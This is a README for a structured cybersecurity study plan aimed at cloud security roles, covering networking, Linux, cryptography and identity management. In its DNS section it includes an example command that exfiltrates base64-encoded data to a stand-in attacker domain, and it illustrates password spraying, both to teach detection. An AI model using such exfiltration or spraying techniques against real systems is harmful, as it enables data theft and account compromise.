# 🛡️ IT Security University

### A complete 30-month study plan for going from zero to Cloud Security Architect.

> Inspired by [coding-interview-university](https://github.com/jwasham/coding-interview-university).
> Tailored for Cloud Security Engineers working in regulated European environments.

---

<p align="center">
  <a href="#how-to-use-this">How to Use</a> •
  <a href="#phase-0-prerequisites--setup">Phase 0</a> •
  <a href="#phase-1-security-fundamentals-month-1-8--300h">Phase 1</a> •
  <a href="#phase-2-cloud-foundations--security-month-8-14--250h">Phase 2</a> •
  <a href="#phase-3-cloud-security-engineering-month-14-20--250h">Phase 3</a> •
  <a href="#phase-4-advanced-architecture--governance-month-20-26--250h">Phase 4</a> •
  <a href="#phase-5-expert-topics--capstone-month-26-30--200h">Phase 5</a> •
  <a href="#certification-roadmap">Certs</a> •
  <a href="#books">Books</a>
</p>

---

## My Story

When I started, I didn't know a SYN from an ACK, couldn't explain the difference between symmetric and asymmetric encryption, and had never written a KQL query. Every security tool I'd used was a black box. I was a software developer who wanted to become a Cloud Security Engineer — and eventually an Architect — but I didn't have a CS degree in security and had no idea where to begin.

I found plenty of "get your CISSP in 30 days" guides and vendor certification paths, but nothing that combined **deep fundamentals** with **hands-on cloud security skills** in a structured, long-term plan. So I built one.

This is not a list of things to memorize. It's a curriculum. The goal is to understand deeply enough that you could explain each concept to a colleague, implement it in a lab, and defend it in an architecture review.

**There is a lot to learn.** But you don't need to know everything — you need deep fundamentals plus cloud-specific expertise. That's what this plan covers.

---

## What This Plan Is (and Isn't)

**This plan IS:**
- A 30-month, ~1,300-hour study plan (~10h/week)
- Focused on **understanding**, not memorization
- Built around the principle: **Watch → Read → Practice → Build**
- Designed for people targeting Cloud Security Engineer → Architect roles
- Optimized for the European (especially DACH/regulated) job market
- Certification-aligned but not certification-dependent
- Free to fork, modify, and make your own

**This plan is NOT:**
- A SOC analyst path (though detection skills are covered)
- A penetration testing curriculum (though offensive skills are included for defense)
- A "speed run" to certifications
- A replacement for hands-on experience

---

## How to Use This

1. **Fork this repo** and create a branch for your progress
2. Mark items with `[x]` as you complete them
3. For each topic: **Watch → Read → Practice → Build**
4. Commit regularly: `git commit -am "Phase 1.3 — Cryptography complete"`
5. Aim for understanding — if you can't explain it simply, you don't understand it yet

### Time Budget

```
┌─────────────────────────────────────────────────────────┐
│  Weekday Sessions (Mon–Fri):  5 × 1h    = 5h           │
│    → Commute, lunch break, or evening session           │
│    → Focus: Reading, videos, theory, flashcards         │
│                                                         │
│  Weekend Deep Dive (Sat or Sun): 1 × 4-5h = 5h         │
│    → Focus: Labs, hands-on practice, building things    │
│    → This is where real learning happens                │
└─────────────────────────────────────────────────────────┘

At 10h/week you cover ~1,300 hours over 30 months.
That's enough for deep mastery if you stay consistent
and avoid "tutorial hell."

The key: every theory hour should be matched with practice.
```

### 30-Month Overview

```
Month:  0  1──────────8  9─────────14  15────────20  21────────26  27───30
        │  │           │  │           │  │           │  │           │  │    │
 Phase: 0  │  PHASE 1  │  │  PHASE 2 │  │  PHASE 3 │  │  PHASE 4 │  │ P5 │
        │  │ Security  │  │ Cloud    │  │ Cloud Sec│  │ Advanced │  │    │
        │  │ Fundament.│  │ Found.   │  │ Engineer.│  │ Architect│  │    │
        │  │  ~300h    │  │  ~250h   │  │  ~250h   │  │  ~250h   │  │200h│
        │  │           │  │          │  │          │  │          │  │    │
 Certs: │  SEC1─┐Sec+─┐  AZ-104─┐   SC-500  SC-300 │  CCSK──┐   TF/ │
        │      M4    M8       M11    M16    M18     │       M24  CKS │
        │                                           │            M30 │
 Total: └──────── ~1,300 hours over 30 months ──────────────────────┘
```

### Certification Alignment Tags

Throughout this document, topics aligned with specific certifications are tagged:

| Tag | Certification | Phase |
|-----|--------------|-------|
| `🛡️ Sec+` | CompTIA Security+ (SY0-701) | 1 |
| `📋 SEC1` | TryHackMe Security Engineer Path | 1 |
| `🔷 AZ-104` | Microsoft Azure Administrator | 2 |
| `🔶 SC-500` | Microsoft Cloud & AI Security Engineer | 3 |
| `🟡 SC-300` | Microsoft Identity & Access Administrator | 3 |
| `🟢 TF` | HashiCorp Terraform Associate | 2–5 |
| `🔵 VN` | Vendor-neutral (CCSK, CCSP, CKS) | 4–5 |

### Already Completed ✅

- [x] ~~AZ-900 — Azure Fundamentals~~ ✅
- [x] ~~SC-900 — Security, Compliance, and Identity Fundamentals~~ ✅

---

## Table of Contents

- [Phase 0: Prerequisites & Setup](#phase-0-prerequisites--setup)
- [Phase 1: Security Fundamentals (Month 1–8)](#phase-1-security-fundamentals-month-1-8--300h)
  - [1.1 Networking Deep Dive](#11-networking-deep-dive)
  - [1.2 Operating Systems & Linux](#12-operating-systems--linux)
  - [1.3 Cryptography](#13-cryptography)
  - [1.4 Identity & Access Management Fundamentals](#14-identity--access-management-fundamentals)
  - [1.5 Security Principles & Frameworks](#15-security-principles--frameworks)
  - [1.6 Threat Modeling](#16-threat-modeling)
  - [Security+ Exam Checkpoint](#-phase-1-cert-checkpoint-comptia-security-sy0-701)
- [Phase 2: Cloud Foundations & Security (Month 8–14)](#phase-2-cloud-foundations--security-month-8-14--250h)
  - [2.1 Cloud Computing Fundamentals](#21-cloud-computing-fundamentals)
  - [2.2 Azure Administration & Security](#22-azure-administration--security)
  - [2.3 Infrastructure as Code (Terraform)](#23-infrastructure-as-code-terraform)
  - [2.4 Container & Kubernetes Security](#24-container--kubernetes-security)
  - [2.5 Network Security in the Cloud](#25-network-security-in-the-cloud)
- [Phase 3: Cloud Security Engineering (Month 14–20)](#phase-3-cloud-security-engineering-month-14-20--250h)
  - [3.1 Security Operations & Monitoring](#31-security-operations--monitoring)
  - [3.2 Identity & Access Management (Cloud)](#32-identity--access-management-cloud)
  - [3.3 Application Security](#33-application-security)
  - [3.4 DevSecOps & CI/CD Security](#34-devsecops--cicd-security)
  - [3.5 AI Security](#35-ai-security)
- [Phase 4: Advanced Architecture & Governance (Month 20–26)](#phase-4-advanced-architecture--governance-month-20-26--250h)
  - [4.1 Zero Trust Architecture](#41-zero-trust-architecture)
  - [4.2 Data Protection & Encryption at Scale](#42-data-protection--encryption-at-scale)
  - [4.3 Cloud Security Posture Management](#43-cloud-security-posture-management)
  - [4.4 Multi-Cloud & Sovereign Cloud](#44-multi-cloud--sovereign-cloud)
  - [4.5 Compliance & Governance](#45-compliance--governance-dora-nis2-c5)
- [Phase 5: Expert Topics & Capstone (Month 26–30)](#phase-5-expert-topics--capstone-month-26-30--200h)
  - [5.1 Security Architecture Design](#51-security-architecture-design)
  - [5.2 Offensive Cloud Security](#52-offensive-cloud-security-purple-team-perspective)
  - [5.3 Incident Response in Cloud Environments](#53-incident-response-in-cloud-environments)
  - [5.4 Leadership & Communication](#54-leadership--communication-for-security-architects)
- [Certification Roadmap](#certification-roadmap)
- [Books](#books)
- [Hands-On Platforms](#hands-on-platforms)
- [YouTube Channels & Free Courses](#youtube-channels--free-courses)
- [Ongoing Practice](#ongoing-practice)
- [Portfolio Projects](#portfolio-projects)
- [Anti-Burnout Framework](#-anti-burnout-framework)
- [Changelog](#changelog)

---

## Phase 0: Prerequisites & Setup

Before diving into security, make sure your environment and mindset are ready.

> **⏱️ Time:** ~20h (2 weeks at 10h/week). Don't overthink this — get your lab running and move on.

### Lab Environment

- [ ] Set up a hypervisor (VirtualBox or Hyper-V)
- [ ] Install Kali Linux VM — your security testing workstation
- [ ] Install Ubuntu Server VM — your target/lab server
- [ ] Create a free Azure account (student or pay-as-you-go)
- [ ] Install Azure CLI, PowerShell 7, and the Az module
- [ ] Install Terraform CLI
- [ ] Set up a GitHub repo for all your lab work and notes
- [ ] Install Wireshark, Nmap, and Burp Suite Community Edition
- [ ] Install Docker Desktop (or Docker Engine on Linux)
- [ ] Set up VS Code with extensions: YAML, Terraform, KQL, PowerShell, Python

> **Your lab setup should look like this:**
> ```
> Host Machine (Linux/Windows/macOS)
> ├── VirtualBox / Hyper-V
> │   ├── Kali Linux (Attacker VM)
> │   ├── Ubuntu Server (Target VM)
> │   └── Windows Server (AD Lab — later in Phase 3)
> ├── Docker (for containerized labs)
> ├── Azure Tenant (cloud labs)
> └── GitHub Repo (documentation & scripts)
> ```

### Mindset & Learning Method

- [ ] Read: [The Feynman Technique](https://fs.blog/feynman-technique/) — if you can't explain it simply, you don't understand it
- [ ] Set up a personal knowledge base (Obsidian, Notion, or Markdown in Git)
- [ ] Adopt the habit: for every concept, write a one-paragraph explanation and one practical example
- [ ] Understand the **"Build First, Map to Governance"** methodology — implement first, then document controls

### Programming for Security

- [ ] **Python** basics refresher (you will use this throughout the entire plan)
    - Variables, data types, control flow, functions
    - Working with files, JSON, and APIs
    - `requests` library for HTTP calls
    - `subprocess` for running system commands
    - [ ] **Practice:** Write a port scanner in Python (~30 lines)
    - [ ] **Practice:** Write a script that queries Microsoft Graph API for sign-in logs
- [ ] **Bash** scripting fundamentals
    - File operations, piping, grep, awk, sed
    - [ ] **Practice:** Write a log analysis script that extracts failed SSH logins from `/var/log/auth.log`
- [ ] **PowerShell** for security
    - Cmdlets, pipelines, modules (Az, Microsoft.Graph)
    - [ ] **Practice:** Query Entra ID users with specific roles via PowerShell

> **Resources:**
> - [Automate the Boring Stuff with Python](https://automatetheboringstuff.com/) — Free online
> - [Python for Cybersecurity Specialization](https://www.coursera.org/specializations/pythonforcybersecurity) — Coursera (audit free)
> - [Linux Command Line Basics](https://linuxcommand.org/) — Free

**Python quality standard from day one:**
```python
# Every CLI tool follows this pattern:
import argparse
import logging

def main():
    parser = argparse.ArgumentParser(description="Security tool")
    parser.add_argument("target", help="What to scan/parse/verify")
    args = parser.parse_args()
    
    logging.basicConfig(level=logging.INFO,
                        format="%(asctime)s %(levelname)s %(message)s")
    try:
        result = do_the_thing(args.target)
        logging.info(f"Result: {result}")
    except Exception as e:
        logging.error(f"Failed: {e}")
        raise SystemExit(1)

# argparse, logging, pytest, requests — these are your Phase 1 Python skills.
```

---

## Phase 1: Security Fundamentals (Month 1-8) — ~300h

> **Goal:** Build the foundation that every security topic rests on. Without this, cloud security is just clicking buttons you don't understand.
>
> This is the longest phase — don't rush it. Deep fundamentals pay off for years.

| Section | Hours | Weeks |
|---------|:-----:|:-----:|
| 1.1 Networking | 60h | 6 |
| 1.2 OS & Linux | 40h | 4 |
| 1.3 Cryptography | 50h | 5 |
| 1.4 IAM Fundamentals | 30h | 3 |
| 1.5 Frameworks & Principles | 40h | 4 |
| 1.6 Threat Modeling | 20h | 2 |
| TryHackMe SEC1 | 40h | (parallel) |
| Security+ Exam Prep | 40h | 4 |

> **🎯 Cert Milestones:**
> - `📋 SEC1` TryHackMe Security Engineer — Target: Month 1–4 (hands-on parallel to theory)
> - `🛡️ Sec+` CompTIA Security+ SY0-701 — Target: Month 6–8

---

### 📋 TryHackMe SEC1 — Security Engineer Path (parallel)

> Run this **in parallel** with the theory sections below. Do 2–3 THM rooms per week during weekend lab sessions. The hands-on practice reinforces the theory perfectly.

- [ ] Complete: Introduction to Security Engineering
- [ ] Complete: Network Fundamentals module → pairs with Section 1.1
- [ ] Complete: Linux Fundamentals module → pairs with Section 1.2
- [ ] Complete: Web Fundamentals module → preview of Phase 3
- [ ] Complete: Cryptography Basics module → pairs with Section 1.3
- [ ] Complete: Identity and Access Management module → pairs with Section 1.4
- [ ] Complete: Security Principles module → pairs with Section 1.5
- [ ] Complete: Threat & Vulnerability Management module
- [ ] Complete: Security Operations module → preview of Phase 3
- [ ] Complete: Digital Forensics & Incident Response module
- [ ] Complete all SEC1 capstone challenges / final assessment
- [ ] **Earn SEC1 Certificate** 🎯

> ```
> Example Week (10h total):
> ├── Mon–Fri (5h): Read networking chapter, watch crypto lecture
> └── Weekend (5h):
>     ├── 2–3h: THM SEC1 room (hands-on practice of what you read)
>     └── 2h: Lab work (Wireshark captures, nmap scanning)
> ```

---

### 1.1 Networking Deep Dive `🛡️ Sec+`

This is the single most important fundamental. You cannot secure what you don't understand.

#### OSI Model & TCP/IP Stack

- [ ] Understand all 7 layers of the OSI model — know what happens at each layer
- [ ] Understand TCP/IP 4-layer model and how it maps to OSI
- [ ] Know the difference: hub vs. switch vs. router (Layer 2 vs Layer 3)

> **When you type `https://bank.example.com` in your browser:**
> ```
> Layer 7 (Application):   Browser sends HTTP GET request
> Layer 6 (Presentation):  TLS encrypts the data (HTTPS)
> Layer 5 (Session):       TLS handshake establishes session
> Layer 4 (Transport):     TCP 3-way handshake (SYN → SYN-ACK → ACK), Port 443
> Layer 3 (Network):       IP routing — packets find the server
> Layer 2 (Data Link):     Ethernet frames, MAC addresses
> Layer 1 (Physical):      Electrical signals on the wire / radio waves (WiFi)
> ```
> **Security implication:** Attacks exist at EVERY layer.
> ARP spoofing (L2), IP spoofing (L3), SYN flood (L4), TLS downgrade (L5/6), SQL injection (L7).

- [ ] **Video:** [Networking Fundamentals — Practical Networking](https://www.youtube.com/playlist?list=PLIFyRwBY_4bRLmKfP1KnZA6rZbRHtxmXi) (Free)
- [ ] **Video:** [Computer Networking Full Course — Kunal Kushwaha](https://www.youtube.com/watch?v=IPvYjXCsTg8) (Free)

#### TCP & UDP Deep Dive

- [ ] TCP 3-way handshake: SYN, SYN-ACK, ACK — understand each step
- [ ] TCP flags: SYN, ACK, FIN, RST, PSH, URG — what each flag does
- [ ] TCP vs UDP: When is each used? Why does DNS use both?
- [ ] Understand TCP sequence numbers and how they prevent spoofing
- [ ] Connection states: LISTEN, ESTABLISHED, TIME_WAIT, CLOSE_WAIT
- [ ] **Practice:** Capture a TCP handshake in Wireshark — identify all 3 packets

> **TCP 3-Way Handshake:**
> ```
> Client                    Server
>   |  ---- SYN (seq=100) ---->  |   "I want to connect"
>   |  <-- SYN-ACK (seq=300,    |   "OK, I'm ready too"
>   |       ack=101) -----------  |
>   |  ---- ACK (seq=101,       |   "Great, let's go"
>   |       ack=301) ---------->  |
>   |  === Connection Established ===
> ```
> **Security implication:** SYN Flood attacks send millions of SYN packets without completing the handshake, exhausting server resources. This is one of the oldest and most effective DDoS techniques.

#### DNS

- [ ] How DNS resolution works (recursive vs iterative)
- [ ] DNS record types: A, AAAA, CNAME, MX, TXT, NS, SOA, PTR, SRV
- [ ] DNS security: DNSSEC, DNS over HTTPS (DoH), DNS over TLS (DoT)
- [ ] DNS attacks: DNS spoofing/cache poisoning, DNS tunneling, DNS exfiltration
- [ ] **Practice:** Use `dig` and `nslookup` to trace a full DNS resolution
- [ ] **Practice:** Set up a local DNS server (BIND or dnsmasq) and configure zones

> **DNS Exfiltration — why DNS monitoring matters:**
> ```
> An attacker smuggles stolen data out through DNS queries:
>
> nslookup c2VjcmV0ZGF0YQ==.evil-domain.com
>           ^^^^^^^^^^^^^^^^
>           This is base64-encoded stolen data!
>
> The attacker's DNS server receives the query and decodes the subdomain.
> Most firewalls allow DNS (port 53) outbound — making this hard to detect.
>
> → This is why you need DNS analytics in your SIEM (Sentinel, Splunk).
> ```

#### HTTP/HTTPS & TLS

- [ ] HTTP methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
- [ ] HTTP status codes: 200, 301, 302, 400, 401, 403, 404, 500, 502, 503
- [ ] HTTP headers relevant to security: CORS, CSP, HSTS, X-Frame-Options, X-Content-Type-Options
- [ ] TLS 1.3 handshake — understand every step
- [ ] Certificate chains: Root CA → Intermediate CA → Server Certificate
- [ ] Certificate pinning, Certificate Transparency (CT)
- [ ] **Practice:** Inspect a TLS handshake with Wireshark and identify the cipher suite
- [ ] **Practice:** Use `openssl s_client` to examine a server's certificate chain

> **TLS 1.3 Handshake (simplified):**
> ```
> Client                         Server
>   | -- ClientHello ------------> |  (supported ciphers, key share)
>   | <-- ServerHello ------------ |  (chosen cipher, key share, cert)
>   | -- Finished ---------------> |  (encrypted with derived keys)
>   | <--- Application Data -----> |  (all encrypted now)
>
> TLS 1.3 is faster (1-RTT vs 2-RTT in TLS 1.2) AND more secure
> (removed weak ciphers, mandatory forward secrecy).
> ```

#### Subnetting & IP Addressing

- [ ] IPv4 addressing: Network address, host address, broadcast address
- [ ] CIDR notation: /8, /16, /24, /26 — calculate usable hosts
- [ ] Private IP ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
- [ ] NAT (Network Address Translation): How private IPs reach the internet
- [ ] **Practice:** Calculate subnets manually — then build a Python subnet calculator

> **Subnetting in practice:**
> ```
> Network: 10.0.0.0/24
> Subnet mask: 255.255.255.0
> Usable hosts: 10.0.0.1 — 10.0.0.254 (254 hosts)
> Broadcast: 10.0.0.255
>
> Split into /26 subnets:
>   10.0.0.0/26   → 10.0.0.1  - 10.0.0.62   (62 hosts)
>   10.0.0.64/26  → 10.0.0.65 - 10.0.0.126  (62 hosts)
>   10.0.0.128/26 → 10.0.0.129 - 10.0.0.190 (62 hosts)
>   10.0.0.192/26 → 10.0.0.193 - 10.0.0.254 (62 hosts)
> ```
> **Cloud relevance:** In Azure, every VNet needs subnets. A /24 gives you ~251 usable IPs (Azure reserves 5 per subnet). In AWS, similar reservations apply per subnet.

#### Firewalls, Proxies & Load Balancers

- [ ] Stateless vs stateful firewalls
- [ ] Packet filter vs application-level gateway
- [ ] WAF (Web Application Firewall): What it catches, what it doesn't
- [ ] Forward proxy vs reverse proxy
- [ ] Load balancers: L4 vs L7, health checks, session persistence
- [ ] **Practice:** Set up iptables rules on your Ubuntu VM — allow SSH, block ICMP
- [ ] **Practice:** Set up nginx as a reverse proxy with TLS termination

#### Wireless Networking `🛡️ Sec+`

- [ ] WiFi security standards: WEP (broken), WPA2, WPA3
- [ ] 802.1X and RADIUS authentication
- [ ] Common attacks: Evil twin, deauth, KRACK
- [ ] Enterprise WiFi: EAP-TLS, PEAP

#### Network Analysis Tools

- [ ] **Wireshark** — capture and filter traffic
    - [ ] **Practice:** Capture and analyze HTTP, DNS, TLS, SSH traffic
    - [ ] **Practice:** Find malicious traffic in a provided PCAP ([Malware Traffic Analysis](https://www.malware-traffic-analysis.net/) exercises)
- [ ] **tcpdump** — command-line packet capture
    - [ ] **Practice:** `tcpdump -i eth0 port 443 -w capture.pcap`
- [ ] **Nmap** — network scanning and service enumeration
    - [ ] **Practice:** `nmap -sV -sC -O 10.0.0.0/24` — understand SYN scan, connect scan, UDP scan, version scan
- [ ] **Netcat** — the "Swiss army knife" of networking
    - [ ] **Practice:** Set up a simple client-server connection with `nc`

> **Resources:**
> - Book: *Computer Networking: A Top-Down Approach* — Kurose & Ross
> - Book: *Network Security Essentials* — William Stallings
> - Book: *Practical Packet Analysis* — Chris Sanders (Wireshark focused)
> - [Malware Traffic Analysis](https://www.malware-traffic-analysis.net/) — Free PCAP exercises
> - [Professor Messer's Network+](https://www.professormesser.com/network-plus/) — YouTube (Free)
> - TryHackMe: Network Fundamentals module
> - HackTheBox Academy: Networking Fundamentals module

---

### 1.2 Operating Systems & Linux

You will work with Linux daily in cloud security. No shortcuts here.

#### Linux Fundamentals

- [ ] File system hierarchy: /, /etc, /var, /home, /tmp, /proc, /dev
- [ ] File permissions: rwx, chmod, chown, SUID, SGID, sticky bit
- [ ] User management: useradd, usermod, /etc/passwd, /etc/shadow
- [ ] Process management: ps, top, htop, kill, systemctl, journalctl
- [ ] Package management: apt, yum/dnf, snap
- [ ] Networking tools: ip, ss, netstat, iptables, nftables, curl, wget
- [ ] SSH: key-based auth, ssh-keygen, ssh-agent, SSH tunneling, port forwarding
- [ ] Log files: /var/log/syslog, /var/log/auth.log, journalctl
- [ ] Cron jobs and scheduled tasks

> **Linux File Permissions — why this matters for cloud:**
> ```bash
> $ ls -la /etc/shadow
> -rw-r----- 1 root shadow 1234 Mar 15 10:00 /etc/shadow
>
> -rw-r-----
> - = regular file
> rw- = owner (root) can read/write
> r-- = group (shadow) can read
> --- = others have NO access
>
> Why it matters: /etc/shadow stores password hashes.
> If permissions were -rw-r--r-- (world-readable), any user could
> grab hashes and crack them offline with Hashcat!
>
> → Same principle in the cloud: Azure Key Vault access policies,
>   storage account keys, managed identity tokens.
>   Least privilege starts with file permissions.
> ```

- [ ] **Practice:** Harden an Ubuntu Server — disable root SSH, configure key-only auth, set up fail2ban
- [ ] **Practice:** Write a bash script that monitors /var/log/auth.log for brute force attempts

#### Linux Security Hardening

- [ ] CIS Benchmarks for Linux — download and apply to your lab VM
- [ ] AppArmor / SELinux: Understand mandatory access control
- [ ] Audit framework: auditd, aureport, ausearch
- [ ] Disk encryption: LUKS
- [ ] Secure boot chain
- [ ] **Practice:** Run [Lynis](https://cisofy.com/lynis/) against your Ubuntu VM and remediate top findings

#### Windows Security Fundamentals `🛡️ Sec+`

- [ ] Active Directory basics: Domains, OUs, Group Policy, Kerberos
- [ ] Windows event logs: Security, System, Application (Event Viewer)
- [ ] Key Event IDs: 4624 (logon), 4625 (failed logon), 4720 (user created), 4732 (user added to group), 1102 (log cleared)
- [ ] Windows Defender, AMSI, SmartScreen
- [ ] PowerShell execution policies and constrained language mode
- [ ] NTLM vs Kerberos authentication

> **Critical Windows Event IDs (memorize these):**
> ```
> 4624 — Successful logon (Logon Type: 2=interactive, 3=network, 10=RDP)
> 4625 — Failed logon (brute force indicator when many in short time)
> 4648 — Logon with explicit credentials (possible lateral movement)
> 4720 — New user account created (persistence indicator)
> 4732 — User added to security group (privilege escalation)
> 4688 — New process created (enable command line logging!)
> 1102 — Security log cleared (attacker covering tracks)
> ```

> **Resources:**
> - TryHackMe: Linux Fundamentals path (Free) + Windows Fundamentals path (Free)
> - HackTheBox Academy: Linux Fundamentals module
> - [OverTheWire: Bandit](https://overthewire.org/wargames/bandit/) — Linux CLI challenge (Free)

---

### 1.3 Cryptography `🛡️ Sec+`

Without understanding crypto, you can't evaluate encryption at rest, in transit, key management, or certificate infrastructure in the cloud.

#### Symmetric Encryption

- [ ] How it works: Same key encrypts and decrypts
- [ ] AES (Advanced Encryption Standard): Block cipher, 128/192/256-bit keys
- [ ] Modes of operation: ECB (insecure!), CBC, CTR, GCM (authenticated)
- [ ] Why AES-GCM is preferred: Provides both confidentiality AND integrity

> **Why ECB Mode is Dangerous (the "ECB Penguin Problem"):**
> ```
> Original image data (pixels are blocks):
> [sky] [sky] [sky] [house] [house] [sky]
>
> AES-ECB encrypts each block independently:
> [abc] [abc] [abc] [xyz]  [xyz]  [abc]
>        ↑ Same plaintext = same ciphertext!
>        → You can still see the pattern/shape!
>
> AES-CBC chains each block to the previous one:
> [abc] [def] [ghi] [jkl]  [mno]  [pqr]
>        ↑ Each block is different, even if plaintext repeats
>        → Pattern is completely hidden
> ```
> Search "ECB Penguin" for the famous visual demo.
> **Cloud relevance:** Azure Storage Service Encryption uses AES-256. Now you know *why* mode matters.

#### Asymmetric Encryption

- [ ] How it works: Public key encrypts, private key decrypts (or vice versa for signing)
- [ ] RSA: How it works mathematically (prime factoring), typical key sizes (2048, 4096)
- [ ] Elliptic Curve Cryptography (ECC): Why it's more efficient, ECDSA, ECDH
- [ ] Diffie-Hellman key exchange: How two parties agree on a shared secret over an insecure channel
- [ ] Digital signatures: Sign with private key, verify with public key → proves authenticity & integrity

> **Diffie-Hellman Key Exchange (simplified):**
> ```
> Alice and Bob want a shared secret over the internet.
>
> Public values: prime p=23, generator g=5
>
> Alice picks secret a=6:     A = g^a mod p = 5^6 mod 23 = 8
> Bob picks secret b=15:      B = g^b mod p = 5^15 mod 23 = 19
>
> They exchange A=8 and B=19 publicly.
>
> Alice computes: B^a mod p = 19^6 mod 23 = 2
> Bob computes:   A^b mod p = 8^15 mod 23 = 2
>
> Shared secret = 2 ✓ (Same for both!)
> An eavesdropper who sees p, g, A, B cannot easily compute
> the shared secret without solving the discrete logarithm problem.
> ```

#### Hashing

- [ ] Properties: One-way, deterministic, avalanche effect, collision resistance
- [ ] MD5 (broken), SHA-1 (broken), SHA-256, SHA-3
- [ ] Password hashing: bcrypt, scrypt, Argon2 — why regular hashing is not enough
- [ ] HMAC: Keyed hashing for message authentication
- [ ] **Practice:** Hash a file with SHA-256, change one byte, hash again — observe the avalanche effect

#### PKI (Public Key Infrastructure)

- [ ] Certificate Authorities (CA): Root CA, Intermediate CA, leaf certificates
- [ ] X.509 certificate format: Subject, Issuer, Validity, Public Key, Extensions
- [ ] Certificate signing request (CSR) workflow
- [ ] Certificate revocation: CRL, OCSP, OCSP stapling
- [ ] Certificate Transparency (CT) logs
- [ ] **Practice:** Create a self-signed CA with OpenSSL, issue a server certificate, set up HTTPS on nginx
- [ ] `🔷 AZ-104` **Practice:** Deploy an Azure Key Vault and store/manage certificates

> **Certificate Chain of Trust:**
> ```
> Root CA (e.g. DigiCert Global Root G2)
>   → Installed in your OS/browser trust store
>   → Self-signed (trusts itself)
>     │
>     ├── Intermediate CA (e.g. DigiCert SHA2 EV Server CA)
>     │   → Signed by Root CA
>     │     │
>     │     └── Server Certificate (www.bank.example.com)
>     │         → Signed by Intermediate CA
>     │         → Contains the bank's public key
>     │         → Valid for 1 year
>     │
>     └── Why intermediates? If one is compromised,
>         you revoke it without replacing the root in every device.
> ```

#### Key Management

- [ ] Key lifecycle: Generation → Storage → Distribution → Rotation → Destruction
- [ ] Hardware Security Modules (HSM): What they are, why they matter
- [ ] `🔷 AZ-104` Azure Key Vault: Keys, secrets, certificates, access policies
- [ ] Key wrapping / envelope encryption
- [ ] Bring Your Own Key (BYOK), Hold Your Own Key (HYOK)
- [ ] **Practice:** Implement envelope encryption with Azure Key Vault

#### Post-Quantum Cryptography (Awareness)

- [ ] Why quantum computers threaten RSA and ECC
- [ ] NIST PQC standardization: CRYSTALS-Kyber (key exchange), CRYSTALS-Dilithium (signatures)
- [ ] "Harvest now, decrypt later" threat
- [ ] Timeline awareness: Crypto-relevant quantum computers are 10–15 years away, but migration starts now

> **Resources:**
> - Book: *Serious Cryptography* — Jean-Philippe Aumasson (THE practical crypto book)
> - Book: *The Code Book* — Simon Singh (history, great for motivation)
> - [Christof Paar — Introduction to Cryptography](https://www.youtube.com/channel/UC1usFRN4LCMcfIV7UjHNuQg) — YouTube lectures (Free, excellent)
> - [CryptoHack](https://cryptohack.org/) — Interactive challenges (Free)
> - [CryptoPals](https://cryptopals.com/) — Programming challenges (Free)

---

### 1.4 Identity & Access Management Fundamentals `🛡️ Sec+`

IAM is the cornerstone of cloud security. Understand it generically first, then go cloud-specific in Phase 3.

#### Authentication

- [ ] Factors: Something you know (password), have (token), are (biometrics)
- [ ] Multi-Factor Authentication (MFA): TOTP, FIDO2/WebAuthn, push notifications
- [ ] Password attacks: Brute force, dictionary, credential stuffing, password spraying
- [ ] Password storage: Salting + hashing (bcrypt/Argon2), why MD5/SHA1 are terrible
- [ ] Single Sign-On (SSO): How it works, why it's a security enabler
- [ ] **Practice:** Set up TOTP-based MFA on your lab server (google-authenticator PAM module)

> **Password Spraying vs Brute Force:**
> ```
> Brute Force (targets ONE account):
>   admin:password1
>   admin:password2
>   admin:password3
>   → Triggers account lockout after 5 attempts!
>
> Password Spraying (targets MANY accounts with ONE password):
>   user1@company.com:Summer2026!
>   user2@company.com:Summer2026!
>   user3@company.com:Summer2026!
>   → 1 attempt per account = stays under lockout threshold
>   → Very effective against weak password policies
>
> → Cloud defense: Conditional Access + Smart Lockout in Entra ID
>   protects against exactly this.
> ```

#### Authorization

- [ ] RBAC (Role-Based Access Control): Roles, permissions, role assignments
- [ ] ABAC (Attribute-Based Access Control): Policies based on attributes (time, location, device)
- [ ] Least Privilege Principle: Minimum access needed, and no more
- [ ] Separation of Duties: No single person controls an entire critical process
- [ ] Just-in-Time (JIT) access: Elevate permissions only when needed, for a limited time
- [ ] `🟡 SC-300` Privileged Identity Management (PIM): Azure PIM concepts

#### Federation & Protocols

- [ ] SAML 2.0: How it works, assertion structure, IdP vs SP
- [ ] OAuth 2.0: Authorization framework, grant types (Authorization Code, Client Credentials)
- [ ] OpenID Connect (OIDC): Authentication layer on top of OAuth 2.0
- [ ] Kerberos: Ticket-Granting Ticket (TGT), Service Ticket, KDC
- [ ] LDAP: Directory services, search filters, common attacks (LDAP injection)

> **OAuth 2.0 Authorization Code Flow:**
> ```
> User → App:          "I want to log in"
> App → Auth Server:   "Here's my client_id, redirect_uri, scope"
>                      (Browser redirects to login page)
> User → Auth Server:  "Here are my credentials"
> Auth Server → App:   "Here's an authorization_code" (via redirect)
> App → Auth Server:   "Here's the code + my client_secret"
> Auth Server → App:   "Here's an access_token (+ refresh_token)"
> App → API:           "Here's my access_token" (Authorization header)
> API → App:           "Here's the protected data"
>
> → This is exactly how Microsoft Graph API authentication works.
> ```

> **Resources:**
> - [OAuth 2.0 Simplified](https://www.oauth.com/) — Free online book
> - Microsoft Learn: [Identity Fundamentals](https://learn.microsoft.com/en-us/entra/fundamentals/) — Free
> - TryHackMe: Authentication Bypass rooms

---

### 1.5 Security Principles & Frameworks `🛡️ Sec+` `📋 SEC1`

#### CIA Triad & Design Principles

- [ ] Confidentiality, Integrity, Availability — the foundation
- [ ] Authentication, Authorization, Non-repudiation — the extensions
- [ ] Defense in Depth: Multiple layers of security controls
- [ ] Least Privilege: Minimum access necessary
- [ ] Fail-Safe Defaults: Deny by default, allow by exception
- [ ] Economy of Mechanism: Keep security mechanisms simple
- [ ] Complete Mediation: Check every access request

#### Security Frameworks

- [ ] **NIST Cybersecurity Framework (CSF 2.0):** Identify, Protect, Detect, Respond, Recover, Govern
    - [ ] Read: [NIST CSF 2.0](https://www.nist.gov/cyberframework) — Free
- [ ] **ISO 27001/27002:** ISMS, Controls structure, Statement of Applicability
- [ ] **BSI IT-Grundschutz:** The German framework — especially relevant for regulated industries in DACH
- [ ] **CIS Controls v8:** Implementation Groups IG1, IG2, IG3
- [ ] **MITRE ATT&CK:** Tactics, Techniques, Procedures — the common language for threats
    - [ ] Read: [MITRE ATT&CK Cloud Matrix](https://attack.mitre.org/matrices/enterprise/cloud/) — Free
- [ ] **Practice:** Map 5 CIS Controls to their Azure implementation
